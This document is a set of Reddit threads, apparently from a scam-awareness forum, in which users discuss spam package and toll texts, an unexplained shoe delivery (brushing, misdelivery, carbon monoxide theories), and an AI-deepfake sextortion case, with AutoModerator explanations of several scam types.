- In December I was getting the USPS text every day, like clockwork. I assume scammers knew that in December most people are sending/receiving packages. They've dropped off considerably this month. I occasionally get the "unpaid toll" text. I've never received the third text. 

It's annoying, but I just click "delete and report junk." I don't know if it helps, but I do it anyway.
- I changed my phone number once about six years ago, and the situation instantly got worse.  I then knew why the last person dumped that number.
- These scams are taking the shotgun blast approach, you send it to enough people, you‚Äôre going to get a certain % of return. 

As long as people ignore who is sending a text and ignore how the URL link is formed, it will keep going. 

I still get ‚ÄúNigerian prince‚Äù type emails and those have been around since the 1990s in email and even earlier via fax / regular letter. 

It costs basically nothing to spam these out, and as long as it remains relatively profitable, they‚Äôll continue in perpetuity. 

Education is the only way to really fight these scams because law enforcement doesn‚Äôt have the budget to chase these smaller scammers, when they‚Äôre going after people who are stealing millions.
- Until the carriers are penalized for allowing it nothing will change.
- "Is anyone else getting these texts?"


Yes.¬† Everyone with cell phones.


Spam/Block/Delete


Move on.
- I have received several USPS texts and a few of the unpaid toll texts.  My assumption is that everyone gets them.
- if you are responding to them, they will keep coming.
- Yep!

And I've also been getting a lot of the job offer ones too.

I've never responded to one, ever. And even so, I've noticed a pretty drastic increase of them in the last few months!
- I got a lot of the package one in December (seems like a good month for that one) and several of the toll one this month.
- "so it‚Äôs making me nervous that I have to constantly keep checking on older family to make sure that they‚Äôre not falling for this crap"

Make sure that they don't do any business by text that they did not initiate.

I only use text for 2FA and "your table or dry cleaning is ready" type texts, nothing interactive.
- If your data was part of any of the data breaches that's happened over the years, expect scams in every way, shape or form.  Don't panic, but be vigilant.
- You can help out elderly relatives by adding all their friends, relatives, doctors, etc. to the contacts list on their phone, and then setting their phone to block incoming calls and texts that aren't on the contact list. Someone posted how to do this a few days ago.
- I get them every day and have never once replied to them.  I just block and report as junk.  Same with the one-word texts ‚ÄúHey‚Äù from unknown numbers.
- I‚Äôm not getting them as much as I once did but yes, i get one every now and then.
- Those are the scams de jour. Block, delete, move on.
- >Is anyone else getting these texts? And have you seen a huge uptick in these since December?

- Yes getting them for ages but still the same rate
- It's harvest season for scammers. Americans need to learn to ignore them.
- There is a big uptick in those usually around the holidays. So around Christmas through Valentine‚Äôs Day you see a lot due to people sending gifts etc.  Easier to dupe someone when they are expecting a package from someone else.
- I'm Canadian, and I get these texts.....it's not USPS in Canada, we have Canada Post.....
- Search this sub for "toll", "usps".
- I get those almost daily. I always reply FUCK OFF and then delete/report as junk
- I get more "unpaid toll" messages than times I actually drive
- Nope, I just report and delete. Even blocked the numbers. Crafty jerks
- I need to look into this. Thank you
- Just found it interesting because I‚Äôve never received so many in such a short time frame. Usually one here and there. But even during previous years around the holidays it‚Äôs never been this bad

I have no recollection of placing an order, especially since I'm not familiar with this company. I posted to my socials to see if anyone sent me a gift but had no bites. It's especially strange because they are all my size. I double checked all my banking accounts and emails, but see nothing about HeyDude. I messaged customer service but they wouldn't help me unless I provided my email and phone number "for verification purposes", which I wasn't willing to do.Has anyone else experienced this?

- Okay I'm going to be this guy, but this is reddit so it's compulsory.

You have mentioned they were ordered in your name and are your size. I have a few questions:
- is any of a significant date incoming, such as birthday
- do you or any people at your house experience headaches, confusion and dizziness
- Was the package addressed to you? If so, you‚Äôre entitled to keep them.
- Is anyone in your house on Ambien? I ordered from QVC and had no memory of it. I was so mad when I was looking at my credit card account online. My husband came home & I told him how outrageous this was and he told me he was sitting next to me when I picked up the phone & made the order. 
I don't take Ambien anymore.
- this is a legitimate company, so i don‚Äôt think it‚Äôs strange they need your email address to verify an order
- Edit to add: I noticed there was a label stuck on top of another label that I was able to pull back. I could piece together the original label, which had the same name, but a different address within the same state. Public records show her in this area in the 90s but now on the opposite coast.
- Have you order anything recently from a niche or small apparel company? Often they outsource their warehousing and these things can happen. For example, I received a package with a lot of Barstool items in it (which I have never ordered from them). I was able to detect that the package was sent from the same warehouse that the company I work for uses to send their apparel. So a simple labeling issue.
- I got an order of steaks and shrimp sent to where I live once. I thought I had a secret admirer for a while
- I work in ecomm for heydude/crocs, you can ask live chat about the order and get answers. No one is going to make you ship back, if it was fraud it was on us to catch before the order was placed - but chances are someone ordered these on your behalf. Cheers!
- Are they your size?
- One time I got a box of stuff from a company, the type of company someone who was trying to pick out a gift for me would order for me if they lived out of state or something. It showed up 2 weeks before my birthday. When I looked it up it was almost a $100 order. I asked around, called family and friends out of state, and could not figure out for the life of me where it came from. So I started using the stuff and shared it with friends too. A little over a week later a postman comes to my house asking if I got a package in my name that wasn't for me. I denied it super embarrassed at this point not sure what was going on. Turns out a guy with the exact same name moved into the apartment across the street. Being unfamiliar with his new address he must have auto filled when making the order with an existing address and it happened to be my buildings number. There was no apartment number on it and our shared name was on it so it definitely came to me. This began a year long series of unfortunate events of my mail going to him and his mail coming to me and the postmen not being able to read numbers correctly. I even had ppl from the attorney general office coming to look for him at my address in person and I had to point them across the way. After a year he moved away and everything went back to normal.
- Is it at all possible that you entered a contest somewhere - facebook, instagram, online in general. Not necessarily for these shoes - but for anything. A quick search showed several contests or sweepstakes to win that brand of shoes in the last couple of years. There's also the possibility that a fulfillment house mixed up the prizes and you were supposed to get something different like you won a case of potato chips or something and they grabbed the wrong prize box in the warehouse. I've had the wrong prize shipped to me before, also substitute prizes.
- Keep  the merchandise and if they send you a bill refuse to pay it

It's possible somebody ordered it for you as a gift and didn't tell you though
- If it‚Äôs addressed to you by name you get to keep them without worries.
- You can post them here for donation to LA if you want: https://www.liquidonate.com/disasterrelief/lafire2025
- I work customer service for a different clothing company. This happens sometimes when people using a stolen card use your name and address as the delivery address, and when it ships out they try to get the carrier to intercept it and get it to their address instead. I think they just get it online because as far as I can tell it‚Äôs completely random. A lot of the time we use SurePost or whatever the equivalent is so since it‚Äôs so direct they can‚Äôt change the address and you end up w the scammers stuff. 

Also I have never ordered from Hey Dude directly, just Amazon, but the 3 pairs of Hey Dudes I ordered for Christmas gifts this year came in shoe boxes and not these bags but could be to save shipping space since it‚Äôs 4 pairs.
- If I received an unsolicited order, I would just mark the package "Return To Sender" and put it in a mailbox...

*Not your circus, not your monkeys!*
- Under US law you are not responsible for paying for unsolicited items sent to you! I would contact your Credit Cards & Bank Debit department to tell them not to approve any purchases from this company. Use a secure search engine like DuckDuckGo to estimate the cost of these items and also block any new charges in that range without your approval.
- Just learned about this scam 

https://youtu.be/pFIsWu5OVBM?si=MHGr4eCji7V4zZ2F
- Is probably someone using your address to mail goods from stolen credit cards. Probably hoping no one is at home when pkg arrives so they can retrieve it.
- Are you an influencer or youtuber ive heard companies will just send out products for youtubers to test and maybe promote and hey dude sounds like a familiar one for sponsorships
- How long have you lived at your home? Do you sometimes receive mail for other people at your address? Was the package actually addressed to you?
- Change the password on your temu/aliexpress and other shitty websites and add 2FA. I had "surprise" packages they did using my account and then deleting the order once shipped, without using my money. I didn't get scammed money per se , but once I checked the reviews I was receiving literal glitter pieces, or some other $0 value crap and leaving glowing reviews in scammy listings.
- Did anyone owe you a gift?
- Throwing out this guess.  Hey Dude orders are packed and shipped by a third party company that houses multiple brand inside one warehouse.  I used to work for said company and it's not unheard of for the company to accidentally switch up labels when they're packing out orders.  There's even a possibility that if you've ordered from another company inside that warehouse that they printed out your shipping information by mistake when having to redo the shipping label.  It's extremely rare, but I saw it happen at least a few times.  Have you ordered anything from any other companies online lately?
- I had this happen to me right before Christmas. I ordered some perfume for my wife from Amazon. A specific kind and larger bottle. It came in an Amazon box. The same day with it in a box with the return address of the perfume company but not an Amazon box, was a 3 pack of perfumes. Nothing else in it. No archived orders. No QR code. Nothing. Really odd!
- I wish this would happen to me lol.
- Those are so comfortable! The soles don‚Äôt last long though. Enjoy your shoes.¬†

Oh, and as others have said, get a CO detector.
- [removed]
- If there is any type of QR code in the package don‚Äôt scan it it will automatically infect your device with malware or virus. So enjoy the shoes guilt free.
- I think you ordered this stuff when you were high and forgot about it.
- How long have you lived at your home? Do you sometimes receive mail for other people at your address? Was the package actually addressed to you?
- What? cool and there all your size sweet come up!! No scam maybe just a campaigning technique
- !brushing . Enjoy your new pair of shoes!

- A year after I moved, I placed an order with a company and had it shipped, but I forgot to change my old shipping address on their website. So the order went to my old address. This is probably what happened in your situation. The previous resident of your home placed the order.
- Zappos did this to my dad one time, then later sent him a bill in the mail to pay for them, he sued and won ü§£

- r/scams really needs a !CarbonMonoxide bot.

If weird unexplained things keep happening seriously consider if it's CO poisoning.

This is just one odd thing but being that they are addressed to you and in your size and nobody knows where they came from, it is *extremely* odd and gives off *strong* CO poison vibes. Check your bank account and your email. See if you have any transactions from them, and if you do, probably time to get a CO detector and a hotel room.
- Wasn‚Äôt this company *Hey Dude* just involved in some kind of scam and or lawsuit recently if my memory serves me correctly?!
- Well now I know that a random person on the internet lives in Sugar Hills, Georgia
- It‚Äôs called a brushing scam
- Is there a card with a QR code? If so, they try to get your phone data if you scan it.
- Wow pls post script if you get the full story. Maybe they lifted your info from somewhere n a shoe store had your size n they're doing a Secret Shoe Santa campaign
- If they‚Äôre size M12 I‚Äôll take the lot for $20

- Yes same thing happened to me in Ambien & I'll never take that med again!! I done stuff that I had no memory of doing but family said I did and they had proof so I would believe them & that's scary! Glad u stopped taking it I'd rather suffer with insomnia than take Ambien again.. melatonin works on me so I'll stick with that.. They need to put stricter warning labels out or take Ambien off the market in my opinion...
- Watch out for high doses of Seroquel (Quetiapine) as well. I would wake up with stomach aches and had spent the night in a trance eating anything I could get my hands on. 

I'd remember getting up to go to the restroom and get some water, but apparently blackout and not make it back to bed for some time. So now I make sure I head immediately back to the bed, no stops, no treats, the gremlin will not be let out!
- Someone said it's strange?
- Maybe it was a forwarding issue? It was a shipping label?
- Going off of the double label comment, was it delivered through FedEx ground? 

If so, at the warehouse there is a team called QA (quality assurance admins) that works on packages with incorrect or incomplete addresses, and they can get a hit on a matching name/address on their address lookup system. QA should call the recipient to verify that they are sending it to the correct person before sending it back out, but some people don‚Äôt do their due diligence or are improperly trained.

If that‚Äôs the case, you can call the customer service line at 1-800-gofedex to report the misdelivery. 

If it‚Äôs through another carrier, same thing could‚Äôve happened but I‚Äôm not familiar with their procedures.
- Do you have a very common or not uncommon name?
- Same name as you?
- ‚ÄúHey Dude‚Äù was a popular kids show on Nickelodeon in the 90s, might have something to do with that?
- Worth noting (as many have suggested Brushing) that Hey Dudes is a legit brand owned by Crocs. Sending legitimate items is not typical of brushing scams.
- My oldest wound up with a box of steaks and chicken instead of her chewy order once. That was UPS's mistake though

LOL, I couldn't help myself. The part of your comment where you said it led to a series of unfortunate events made that Jim Carrey movie pop in my head... üòÅ
- I came home one day to an unexpected package. Opened it up to find a new toilet seat inside. Asked the hubs, no, he didn‚Äôt order it either.

Apparently I won some random contest I had entered and the prize was a toilet seat. I still laugh about it today (and was happy to use the seat when we finally needed to replace the old one) lol
- Incredible idea! Ty for posting this!

- What has duckduckgo have anything to do with this?
- Yep, the package was addressed to me.We've been here for a while
- Yep! You, my friend, were the victim of a !brush scam! 

That made me LOL when I read this:

"Change the password on your temu/aliexpress and other shitty websites" 

The reason it made me laugh is because I've heard so many crappy things about Temu, which I'm guessing is why you referred to it's website as "shitty"! üòÇ

- Do you have one of those QR codes? I have an iPhone I want to jailbreak and an android I want to root.
- Don't know why you're getting downvoted for this. QR codes in unexpected packages happen and yes, it is a scam intended to compromise the device you scan it with.

Whether this is what OP is experiencing, I'm not sure, but it is something that happens. I work in a credit union and deal with members every day who have fallen victim to all kinds of scams, this is one of them.
- I doubt a company that‚Äôs a subsidiary of Crocs is sending OP *4 pairs* of $60 shoes as a brushing scam.
- Hi /u/Weird-Raisin-1009, AutoModerator has been summoned to explain the Brushing or Direct shipping scam.

The scammer is creating and shipping out fake orders in order to both boost order numbers and place false verified reviews. [Here](https://en.wikipedia.org/wiki/Brushing) is the Wikipedia page that explains brushing, and [here](https://www.forbes.com/sites/wadeshepard/2017/11/27/americans-are-receiving-unordered-parcels-from-chinese-e-criminals-and-cant-do-anything-about-it/#dc1df7c73daa) is a news article from Forbes about the scheme. Receiving packages as part of brushing doesn't mean that your private information is compromised, if the items are relatively inexpensive.

If instead you received an expensive item, such as electronics or something like that, your account may be compromised. Log into your account and see if there are orders under your name. A scammer that has access to your account would instead be using your credit card, or a stolen credit card to purchase things in your name and ship them, and then have a porch thief pick them up from your door.

For example, when Amazon accounts are compromised, orders can be archived by the thieves to hide their tracks. Go to https://amazon.com/gp/your-account/order-history?orderFilter=archived to find any of those. If that list is clean, it means that this order didn't originate through your account.

- Ok, people why would you DV this comment?? It's a perfectly logical one! There was a guy on another Reddit sub awhile back... I can't remember which one... and he was afraid he was being stalked in his own apartment because he kept finding weird notes everywhere and just stuff out of place  and it was obvious someone had been on his computer and moved files around and such. So at other Redditors suggestions he set up a hidden video camera & caught the intruder... it was him. Turns out he had a Carbon Monoxide leak & therefore CO poisoning. So... it DOES happen, and memory loss is one of the most prevalent symptoms!
- Usually that's cheap merchandise though
- What's a "Secret Shoe Santa campaign "?
- I'm with this guy. I need a pair. Size 9.5 lol
- [removed]
- actual u/ang89c should
- CO batteries????  CO standing for????
- [removed]
- Could be a brushing scam - but more likely someone was testing to see if they could intercept something sent to your address before you picked it up.
- THen you got some free shoes. if they dont fit you, throw them on ebay or craiglist and make some $
- Are they your size
- [removed]
- They still don't have strict warning labels about it? Damn.
- They did finally put something called a Black Box warning label on it... which is the strongest kind, and some doctors quit prescribing it. I found that if I took it and immediately got in bed I would stay there. It's great for insomnia if a person can avoid the side effects.  It's sister medication, Lunesta, isn't quite as bad.
- I took that too, epiclara, after getting off the Ambien! I didn't do the crazy things I did on Ambien but it made me insanely hungry and I didn't want to gain weight so I got off of it. The scary thing though that happened to me though was it occasionally affected my ability to swallow! Did it ever do that to you?
- OP wasn‚Äôt willing to give that information, so not strange if you actually placed the order, but perhaps strange if you didn‚Äôt, in case it was a scam of some sort.
- yeah I wonder if they found OP's name in their system and figured that's where it was meant to go, and they happen to have a common shoe size? Willing to bet it's around 9.5M
- What would this have to do with a shoe company that has the same name?
- Owned by Crocs?! Well that explains a lot ü§£ü§£
- Maybe a gift from someone?
- OK thats weird then. Maybe a prank or a gift from someone?
- Huh. Your lucky day, I guess.
- I don't want to make generalizations but it's surprising how I never had to deal with this crap until I bought some junk from Temu. I mean is not that Aliexpress is better, it's marginally better and I never had a problem with their customer support. I had spam in the past and robo calls, but ever since Temu they call me by name. Maybe I'm seeing a cause / effect where there's none , but it's still very curious.
- Quite unlikely that scanning a QR code would lead to infection, unless you visit the site... there's a difference between being vigilant with links and being afraid to wield your phone close to QR codes.
- didn't realize they're recognized brand. my bad.
- They're $60 EACH pair? Yowza!

Maybe, but four pairs?
- Wait I thought brushing was when a seller or a company will send a product to you that you didn‚Äôt order so that they can make a fake account and fake reviews under your name?
- Definitely not a brushing scam. These sneakers are like $60-$80 per pair. And no reason to send multiple pairs for brushing.
- What do you mean? Like porch pirates?
- I want to be brushed! I love Hey Dude.
- 4 pairs of Hey dudes at $60 per pair is very unlikely to be a scam
- Yea but why not just order one pair
- They said they are in their size. So my guess is a gift from someone who forgot to tell OP.
- [removed]
- I know they don't...my dr will not prescribe it to any of his patients he usually prescribes clonipon for sleep. I just take melatonin and stopped drinking caffeine drinks 2hrs before bedtime. Im usually in bed around 10pm it was hard at first bc I'm a 24/7 coffee-aholic lol but once my system got used to it it's worked...
- Oh my god yes! I would almost forget how to swallow. One night I must've been eating and started to fall asleep but I woke up with a mouthful of cashews and was choking but I couldn't remember how to swallow them. 

Really insane, like who wants their obituary to be "Passed fighting for their life eating in bed." It makes me so hungry even if I eat right before I take it I don't understand.
- This is a very real company so if OP contacted their legitimate customer service via their website (not via any contact method provided on the package), their customer service is going to have to look up the order SOME way. Since OP doesn‚Äôt have an order number, it‚Äôs completely normal that they would ask for his email to try to look it up. Otherwise there really isn‚Äôt much they can do.
- OP mentioned someone with the same name in the same area as OP but in the 90s. Said show was popular in the 90s, so I was just connecting dots. It was a shot in the dark of a suggestion, no need to break out the downvote brigade lol
- You guys should read the post. The first question about size was answered, and the question about it being a gift was addressed.
- get shoe‚Äôd, ya fuckin nerd!
- It could be, I got a case of soda shipped to me a few years back and it threw me off mentally for a month or so before I finally found out my neighbor sent it as a weird gift
- It's not just you. They seem shady. My mom & I had both ordered some things from Temu and they will drive you nuts with emails and such. I finally had to block them. I think I've heard of Aliexpress but never bought anything from them. But if they're like Temu I'll avoid them like the plague. I haven't ever heard anything good about Temu now that I think about it.
- Oh I know! I noticed that too! Reddit is weird...
- Now the CO battery comment is funny.  Thank you!
- [removed]
- It seems even more excessive as a gift that is a month late. 

OP had no prior knowledge/ relationship with this company. 

There has to be a logical explanation- this seems like the most likely one.
- Usually its cheapest stuff too, from a place like Amazon - that‚Äôs why I think it‚Äôs more likely someone nearby who‚Äôs using stolen credit cards and was checking if the house was vigilant and prompt about retrieving packages (especially unexpected ones).
- Wait someone asked me to do that. How does that work?
- Like they order something that's illegal to order (drugs, weapons etc) and if it's picked up by customs or post, it looks like you're making the order
- Yes, basically. Like next time they‚Äôd order a computer or cell phones or something
- Me too! I have eight pair but I know I need more!
- Credit cards have caught on to the just one dollar trick, pretty much automatically flagged as fraudulent. 

If it was a stolen credit card, doesn‚Äôt really matter to the person ordering how much they spend, but maybe they were testing a charge over $200 or something. 

Also, I cannot imagine these were a gift, since they‚Äôre basically the same shoe in 4 colors and then the gift giver never checks to see why their recipient didn‚Äôt get get it - since it was a pretty pricey spend - $200+

I mean all we have is guessing at this point. 

Maybe OP saw them on TikTok and drunk bought them and forgot ü§∑‚Äç‚ôÇÔ∏è
- No, it does have warning labels on it... but it's for prescribers... you may be talking about for patients, and I agree. They put it in the info leaflet that comes with it but that's not enough.  It should be on the bottle.
- It makes sense that some doctors would stay away from it now, knowing the potential side effects. I believe the side effects hit women extra hard until they did the trials showing that women only need half as much as men, so they cut the dosage for women. I mean, they should have done those trials *before, but it's not shocking that they didn't because women's health isn't taken as seriously as men's health is.
- That is a far reach. Very far. Show ended in 1991. I know, I use to watch it. It's just a coincidence they chose the name of their business that happens to be the same as an old kids show. Happens all the time.
- It's a fun factoid but it's so completely irrelevant.
- Right. So many comments and so many posts are answered in the original post it's so annoying.
- Reeeed? Watt dat?
- Pretty sure those were added to the post after my comments
- Maybe it's a belated Christmas gift...? ü§∑‚Äç‚ôÄÔ∏è
- This. Keep a sharp eye out for your packages going forward, and check your credit report and freeze your credit if you havent already. Someone may be attempting to steal your identity.
- Brushing is when a company sends a package to an address to place a verified review, the item is generally cheap, this doesn‚Äôt generally affect the recipient
- How does what work?
- Well, plausible deniability. They can‚Äôt do nothing regardless if you ordered it or not.

USPS will just send a letter telling you your packaged was seized and to ‚Äúcome pick it up‚Äù which obviously you don‚Äôt, otherwise you‚Äôre in trouble.
- I've got 4 but I want so many more.  Each kid got one for Christmas too. We love them.
- Can you blame me for making the innocent mistake of confusing the two? Because apparently a lot of people here seem upset with me for it. Stupid thing to get mad over.
- Fuck me for making a wrong guess though huh? lmao you all need to chill out. It‚Äôs a stupid thing to dogpile on someone for. Not everybody knows every single reference.
- She did say she asked her family and even posted on fb if you read the post and OPs comments
- Making an account with your name to leave reviews
- THIS. I used to order a product with Ephedra in it after it was banned in the U.S. and Customs would sometimes seize it, and just like AssEatingSquid (I'm dying over here laughing as I typed that! ü§£) wrote, Customs sends a letter informing you of it & that you have 90 days to claim it and show proof that you have a legal right to have it (like if it's meds and you have an FDA license) or it'll be destroyed, and by not claiming it you're giving up all rights to claim it. This was forever ago so I don't remember it verbatim, but I got several over the course of a few years.

- Yeah, my daughter and grandkids introduced me to them a few years ago. My favorites that I have are the ones with silver sequins.
- It's okay.
- Yes, I did read that... but not everyone has social media. I have friends & family that don't have FB or any other kind of social media, and even though she posted it on there doesn't mean that everyone on her social media saw it. For instance, I rarely get on Facebook, so there are a lot of posts I'm sure I miss as a result.
- It's a !task scam
- Depends, ordering domestically so its seized by the mail service and didn‚Äôt go through customs.
- They're so comfortable, and I have feet issues, so they're extremely helpful.
- I‚Äôm going to give OP some credit that she did more than just post it on fb and call it a day even though she knows she has gift giving family members who aren‚Äôt on her Social Media.
- I don't see how it would be a task scam. Task scams & brushing scams aren't even similar except that they're both scams. Task scams are like what the automod explained & the purpose of them is to get money, whereas a brushing scam's purpose seems to be to be able to post reviews by having orders shipped to someone, and sometimes a porch thief will grab that package off the recipient's porch, and the ultimate goal is to create a verifiable order so they can give themselves a review.
- Lmao no it‚Äôs not. Not even close.
- Hi /u/EzraDionysus, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Umm, ok. I didn't realize that my comment implied that OP just "post[ed] it on fb and call[ed] it a day even though she knows she has gift giving family members who aren‚Äôt on her Social Media". You gave the whole thing a lot more thought than I did, it seems.

Title: My cousin got scammed/blackmailed
Body: So my cousin(23M) got a follow request on Instagram from a girl(I know the starting sounds bad but read the whole thing it is way worse) and he accepted it then started sexting with her and a few hours later they exchanged phone numbers and started sexting on WhatsApp. Surprise surprise she wasn't a she but turned out to be a blackmailer. The blackmailer had made an AI generated pornographic video of my cousin masturbating and sent screenshots of sending the video on ig to my cousin's sister, friends and family members and said if he give him 20,000‚Çπ (we are indians studying abroad) he will unsend the video. My cousin just gave him money without asking or consulting, then the blackmailer asked for 1,00,000‚Çπ for removing the video from his computer. 

And my cousin paid additional 60,000‚Çπ to him just for that and after that he talked to us about this thing. This is a scenario where I would definitely not pay the blackmailer but if that video had been sent to his parents or anyone the consequences would've been drastic. I was wondering if there is any way to recover the 80k that he paid. 

Edit: So I understand the money is gone now. And my cousin never sent any of his photos while sexting they were just talking the blackmailer got his photos from ig.

And everyone saying that he never should've paid, I KNOW. I would've never let him pay if I had known and he also knows that he shouldn't have paid but his video reaching his family members would've been the worst. In India due to the relationships it would have been 10 times worse and I don't think he would've been able to handle it mentally, that's the reason he paid. 

Edit 2: The video was 100% AI generated but when my cousin showed me the 10 seconds the first question I asked was "Are you sure this is AI? " because at first glance anyone watching will believe that it is real but after some careful rewatches you could find the mistakes. And what I think is the blackmailer used like the AI + deepfake or something. And according to my cousin when they were talking on call the blackmailer had another 15 of them in the same context of different people. All videos followed the same pattern: first 10-15 seconds of victim starting then a naked girl, same in every video, touching herself and then the victim masturbating. The video was almost 30 seconds long, which is pretty convenient for gpu.

- >I was wondering if there is any way to recover the 80k that he paid.

No...the money he paid the scammer is gone. He needs to be aware of !recovery scammers now.
- Never pay if you're being blackmailed. They will never stop asking for more. 

Also watch out for recovery scams. You won't be able to recover the money.
- STOP PAYING. SHOULD NEVER HAVE PAID.

- Report his account for blackmailing (usually gets taken down within minutes)

- The mofo won't release. If he does then just call it fake Ai manipulation

It's better to face this shit once than live under the entire life.
- No, the money is gone and he literally did the worst thing possible by paying.  Now that he paid them, they knows 3 things:

1. He‚Äôs really gullible 
2. He really doesn‚Äôt want this being leaked
3. He has money to burn 

‚Ä¶so they‚Äôre going to shake him out like a piggy bank. Over and over. No matter how times he pays, they‚Äôll ask for more. And more. 

Had he just blocked them up front, they‚Äôd be gone by now‚Ä¶ they‚Äôd have moved on to an easier target. But now that he paid them, they are gonna ‚Äúinvest in him‚Äù.  They will spend time squeezing more juice out of him. 

If he had blocked them, this would be over by now. But now that he‚Äôs proven he will pay, he is a golden goose. 

But yes, the only way to move on is to block these scammers and stop paying them. **The moment they realize they aren‚Äôt getting more money, they will move on.** Until then, he needs to convince them of this. His first step? Block him. Immediately.
- Not that it matters but I'm curious if it was really "A.I. video" or if your cousin is leaving out the part where he masterbated on camera. I'm guessing the latter but it would be interesting if scammers are incorporating AI like that.
- His money is gone but I hope he learned a valuable lesson not to send pictures of his junk to strangers.
- A lot of people will message you saying they can help, because you wrote this post.

Ignore _all of them_ - they are all hoping to find an easy victim (someone who already got scammed once is easy prey) and convince them they can help for a sudden extra fee.

That money is lost, you ain‚Äôt getting it back and no one can help you.

Take is as a lesson in what to do.
- No.
- There is NO way to get the video deleted and there is no way to get the money back.

Paying more will achieve nothing other than making the scammer more persistent.

Immediately block the scammer and ignore any attempts he makes to make contact again.

!sextortion
- I'm skeptical that the video was AI-generated. Many, many dudes get caught with their pants down with this scam, and if the videos aren't real, why be so concerned about it leaking? Just tell everyone it's fake, and to ignore it.
- This is very common in India - where do you live ? how do you not know about this, 

this happened when it was 2020s, i am amazed its still happening in 2025, your first problem is you share your private details (in this case that's your account) , next sending money to the person. 

report the video to whatever social media you are using it for,
- <<<AI generated pornographic video of my cousin>>>


I don't get it?¬† It's a fake video, why didn't he just tell his family there was a fake video and to ignore it?¬†¬†


The guy still has the video and will surely ask for more.


Go tell all of your friends what happened.¬† If people don't start educating eachother, this will keep happening.¬†


No one wants to see your dick besides scammers¬†


Leaked nudes won't ruin your life.¬† I can not stress this enough, no one actual cares that much.¬† It's going to be like a 3rd of your generation with nudes floating around.¬† ¬†It's not the end if the world.
- [removed]
- Just laugh at them, send em a dick pic and move on with your life. 
Who cares about other peoples opinions? Especially when it's a deep fake. 
If there is any fallout from it being sent to his sister or parents than that is on his family for being so shit and gullible.
- Instagrams getting bad for scams man just make sure he learns from it just a shame the pieces of shit still leak things after they‚Äôve had money sent, happened to someone I had on instagram woke up to a group chat with him on FaceTime in it poor guy
- Once you pay a blackmailer they know they have hit pay dirt. They will always be coming back for more.
- This scam is called Sextortion and I suggest that your cousin cancel the transaction and get his money back if that‚Äôs possible. 

Block the account. This ain‚Äôt your cousin‚Äôs fault at all!
- After my scam I have never ever discussed ANYTHING to do with money over a chat again. 
I learned my lesson.
- Hi /u/TheCheeseDictator, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.


**
- I know that's what I told him that he shouldn't have paid a single ‚Çπ but he got scared about his sister and his family seeing that video that's why he paid
- That is already done. The moment he talked to us we blocked and reported the numbers and ig account. And after that there has been no contact.
- No it was literally an AI generated video, the blackmailer sent him the video and according to my cousin when they were talking on call the blackmailer had another 15 of them in the same context of different people. All videos followed the same pattern: first 10-15 seconds of victim starting then a naked girl, same in every video, touching herself and then the victim masturbating. The video was almost 30 seconds long, which is pretty convenient for gpu.
- No no no he never did that, he never even sent his junk or his any photo to the blackmailer. The blackmailer got his photos from ig and made the ai gen video.
- Hi /u/cloudcats, AutoModerator has been summoned to explain the Sextortion scam.

This scam occurs when you meet a woman/man on dating service/social media site/forum/wherever and they ask you to go on Skype, WhatsApp, Telegram, or another messaging system. They will ask you to exchange naked pictures, and they will usually ask you to include your face in the pictures. They will then threaten to reveal the pictures to your family/friends if you do not pay them. The best thing to do in this situation is block the scammer and go private in your socials for a while. Paying the scammer will not make them back off, and just tells them that it is worth their time to continue threatening you.

If you fell for this scam, we recommend you join the sextortion subreddit and follow the recommendations of their sticky post: https://www.reddit.com/r/Sextortion/comments/n4yorq/new_victims_please_read_first/

Also beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the photos or get back at the extorter. They can't, it's a trick to make you lose more money.


**
- I don‚Äôt get it either, honestly. If they can access his pictures on IG why bother with the sexting once they move to WhatsApp? At that point they could just make the video and blackmail the cousin.

However, I do think in this case the cousin may be telling the truth, because he went as far as showing OP at least part of the video. If he‚Äôs spooked enough to pay blackmailers I don‚Äôt think he would have shown his cousin any of a real video.
- Different cultures.
- I agree, not AI, he's just saying it is because it got sent to his family. 
Why would the scammer even bother getting into a sexting conversation if they're just going to blackmail someone with a fake wank video based on their IG pics, they could have any sort of conversation with the person and still make an AI video of them.
And how is unsending it a sales pitch? It is not going to stop people seeing it, if they already got it and opened it?
- > I don't get it?

Not every culture has the same values.

- Poor dude. Hope he's ok
- People need to be really careful about what they post on social media.  And now if videos get shared with his family, he can claim it was AI generated to cover himself.  A lesson for him.
- What's he worried about if it's obviously AI generated? If that's the case everyone will immediately know it's someone trying to scam your cousin. That's good news for him. Block, ignore and move on is all he can do anyway.
- Even less reason to pay then. Anyone can do the same with literally anyone's pictures.
- Why tf was a clarification post down voted lmao. Fucking redditors man
